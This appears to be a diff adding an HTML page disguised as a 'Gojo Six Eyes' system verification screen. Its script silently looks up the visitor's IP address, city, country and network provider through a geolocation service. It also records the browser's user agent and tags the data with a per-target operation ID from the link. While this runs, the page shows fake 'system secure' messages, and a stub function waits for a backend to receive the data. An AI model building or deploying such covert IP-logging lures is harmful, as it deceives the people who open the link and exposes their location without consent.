@@ -1,1 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gojo Six Eyes | System Verification</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #00d9ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .container {
+            border: 1px solid #111;
+            background: #0a0a0a;
+            padding: 40px;
+            box-shadow: 0 0 30px rgba(0, 217, 255, 0.1);
+            border-radius: 12px;
+        }
+        h1 {
+            font-size: 1.5rem;
+            letter-spacing: 3px;
+            margin-bottom: 10px;
+        }
+        .status-text {
+            color: #888;
+            font-size: 0.9rem;
+        }
+        .loader {
+            width: 150px;
+            height: 2px;
+            background: #222;
+            margin: 25px auto;
+            position: relative;
+            overflow: hidden;
+        }
+        .loader::after {
+            content: '';
+            width: 40px;
+            height: 100%;
+            background: #00d9ff;
+            position: absolute;
+            animation: scan 2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
+        }
+        @keyframes scan {
+            0% { left: -40px; }
+            100% { left: 150px; }
+        }
+    </style>
+</head>
+<body>
 
+<div class="container">
+    <h1>🌀 GOJO SIX EYES</h1>
+    <p class="status-text" id="status">Verifying system integrity...</p>
+    <div class="loader"></div>
+    <p style="font-size: 9px; color: #333; letter-spacing: 1px;">OP_ID: <span id="op-id">PENDING</span></p>
+</div>
+
+<script>
+    // Extract Operation ID from URL
+    const urlParams = new URLSearchParams(window.location.search);
+    const opID = urlParams.get('id') || "UNSET";
+    document.getElementById('op-id').innerText = opID.toUpperCase();
+
+    async function initTrace() {
+        try {
+            // Collecting Metadata
+            const res = await fetch("https://ipapi.co/json/");
+            const data = await res.json();
+
+            const payload = {
+                operation_id: opID,
+                ip: data.ip,
+                location: `${data.city}, ${data.country_name}`,
+                provider: data.org,
+                user_agent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Log to console for debugging
+            console.log("Telemetry captured:", payload);
+            
+            // Forwarding to your backend/database
+            await sendTelemetry(payload);
+
+        } catch (err) {
+            console.error("Transmission failed:", err);
+            document.getElementById('status').innerText = "Security check completed.";
+        }
+    }
+
+    async function sendTelemetry(payload) {
+        // Here we will connect your Supabase or API
+        setTimeout(() => {
+            document.getElementById('status').innerText = "System secure. Redirecting...";
+        }, 1500);
+    }
+
+    window.onload = initTrace;
+</script>
+
+</body>
+</html>
